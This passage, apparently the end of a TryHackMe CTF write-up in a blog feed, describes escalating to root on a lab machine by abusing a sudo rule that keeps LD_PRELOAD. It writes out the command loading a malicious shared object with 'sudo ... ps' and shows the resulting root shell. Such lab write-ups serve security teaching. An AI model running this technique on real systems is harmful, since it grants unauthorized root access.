-&lt;p&gt;I had a look at &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt; for ‘/bin/ps’ but as expected I didn’t find anything, I also noticed ‘env_keep+=LD_PRELOAD’. There is a great course by &lt;a href=&quot;https://twitter.com/thecybermentor&quot;&gt;Heath Adams&lt;/a&gt; on &lt;a href=&quot;https://www.udemy.com/course/linux-privilege-escalation-for-beginners&quot;&gt;udemy&lt;/a&gt; for Linux privesc techinques and this is covered as part of the course. There is also a great &lt;a href=&quot;https://touhidshaikh.com/blog/2018/04/12/sudo-ld_preload-linux-privilege-escalation/&quot;&gt;article&lt;/a&gt; which covers it.&lt;/p&gt;
-
-&lt;p&gt;I used the steps in the article to create a file called evil.c, compiled with GCC. Ran the sudo command with LD_PRELOAD and got root!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;jed@keldagrim:/dev/shm$ sudo LD_PRELOAD=/dev/shm/evil.so ps
-root@keldagrim:/dev/shm# id
-uid=0(root) gid=0(root) groups=0(root)
-root@keldagrim:/dev/shm# 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Thanks for reading!&lt;/p&gt;
-
-&lt;p&gt;============================================================&lt;/p&gt;
-
-&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Darryn</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="tryhackme" />
-      
-        <category term="ctf" />
-      
-        <category term="medium" />
       
 
       
